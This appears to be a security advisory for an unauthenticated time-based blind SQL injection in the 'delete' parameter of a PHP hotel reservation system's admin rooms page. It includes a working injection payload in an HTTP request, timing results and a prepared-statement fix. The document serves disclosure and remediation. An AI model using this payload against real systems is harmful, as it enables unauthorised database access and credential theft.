# SQL Injection in Hotel and Tourism Reservation System PHP 1.0 — /admin/rooms.php

## Affected Product Details
- **Product:** Hotel and Tourism Reservation In PHP
- **Version:** 1.0
- **Vendor:** https://code-projects.org/hotel-and-tourism-reservation-in-php-with-source-code/
- **Vulnerable File:** `/ht/admin/rooms.php`
- **Vulnerable Parameter:** `delete` (GET)
- **Authentication Required:** No
- **Attack Vector:** Remote
- **Vulnerability Type:** Time-based Blind SQL Injection (CWE-89)
- **CVSS v3.1 Score:** 7.5 (High)
- **CVSS v3.1 Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

## Proof of Concept

**Vulnerable Request:**
```http
GET /ht/admin/rooms.php?delete=150'XOR(15*if(now()=sysdate(),sleep(6),0))XOR'Z HTTP/1.1
Host: TARGET
```

**Time-based Confirmation:**
```
sleep(0)  =>  0.005s
sleep(3)  =>  3.014s
sleep(6)  =>  6.012s
sleep(15) => 15.020s
```

## Impact
An unauthenticated remote attacker can enumerate the entire database, extract credentials and sensitive data, and potentially achieve full system compromise.

## Remediation
```php
$stmt = $conn->prepare("DELETE FROM rooms WHERE id=?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

## References
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cwe.mitre.org/data/definitions/89.html
- https://code-projects.org/hotel-and-tourism-reservation-in-php-with-source-code/
